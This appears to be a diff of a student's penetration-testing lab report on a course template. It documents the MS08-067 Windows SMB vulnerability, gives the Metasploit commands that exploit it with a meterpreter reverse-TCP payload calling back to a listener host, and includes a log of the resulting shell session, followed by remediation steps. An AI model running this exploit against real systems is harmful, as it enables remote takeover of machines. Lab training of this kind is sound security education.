@@ -1,6 +1,38 @@
 https://www.offensive-security.com/metasploit-unleashed/scanner-netbios-auxiliary-modules/
 
 
+Potential Vulnerability:
+
+	PORT: 139
+	CVE: CVE-2008-4250
+	DESCRIPTION: The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold
+		     and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted 
+		     RPC request that triggers the overflow during path canonicalization.	
+
+Two possibilities, either it is exploitable or not.
+Fill out below as appropriate.
+
+The system is exploitable:
+	B: Below is an MSF script to exploit it
+
+		use exploit/windows/smb/ms08_067_netapi
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set RHOST 192.168.0.33
+		set SMBDirect false
+		set LHOST 192.168.0.129
+		exploit
+
+	C: Below explain ways one fixes the VM. 
+		https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067
+		
+		1.  Disable the Server and Computer Browser services
+		2.  Block TCP ports 139 and 445 at the firewall
+		
+		
+
+MetaSploit Log
+====================================================================================================================
+
 msf exploit(ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
 
 msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
@@ -34,47 +66,3 @@ Domain          : WORKGROUP
 Logged On Users : 2
 Meterpreter     : x86/windows
 meterpreter > 
-
-
-
-
-Potential Vulnerability:
-
-	DESCRIPTION, CVE, PORT etc. GOES HERE
-
-Two possibilities, either it is exploitable or not.
-Fill out below as appropriate.
-
-The system is exploitable:
-	A: I can't seem to find a way to exploit it using MSF.
-
-		SHOW THAT YOU TRIED
-
-	B: Below is an MSF script to exploit it
-
-		YOUR SCRIPT GOES HERE
-
-	C: Below explain ways one fixes the VM. 
-
-		YOUR EXPLANATION GOES HERE
-
-The system is not exploitable, explain why the system is not exploitable
-by filling in the following as appropriate:
-
-	A: There is no known vulnerability
-
-		EXPLAIN HOW YOU KNOW
-
-	B: There appears to be a vulnerability, 
-		but the system is configured to mitigate
-		against it.
-
-		EXPLAIN, SHOW THE CONFIG/MITIGATION
-
-	C: Some versions of the service are vulnerable, this one is not. 
-
-		I searched: YOUR ANSWER HERE (PROVIDE LINKS)
-
-		Vulnerable versions include: YOUR ANSWER HERE (LINKS)
-
-		The system is using version: YOUR ANSWER HERE (HOW DID YOU FIND THIS)
